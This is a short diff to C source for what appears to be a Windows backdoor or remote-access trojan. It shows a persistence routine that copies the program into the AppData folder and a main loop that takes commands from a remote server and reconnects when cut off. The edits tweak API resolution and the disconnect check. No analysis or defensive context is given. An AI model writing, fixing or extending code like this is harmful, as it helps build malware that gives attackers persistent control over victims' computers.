@@ -421,7 +421,7 @@ void attemptFullPersistence(SOCKET* pSockfd, TCHAR* dirName) {
 	// Get name of program
 	name = wcsrchr(dirName, L'\\');
 
-	pSHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, wszPath);
 
 	wcscat(wszPath, name);
 
@@ -554,7 +554,7 @@ int main(int argc, char* argv[]) {
 		bytesRecv = pRecv(sockfd, commandOpt, sizeof commandOpt, 0);
 
 		// Check for dc
-		if (bytesRecv <= 0 || bytesRecv == WSAECONNRESET) {
+		if (bytesRecv < 0 || bytesRecv == WSAECONNRESET) {
 			if ((sockfd = connectToServer()) == -1) {
 				ExitProcess(1);
 			}
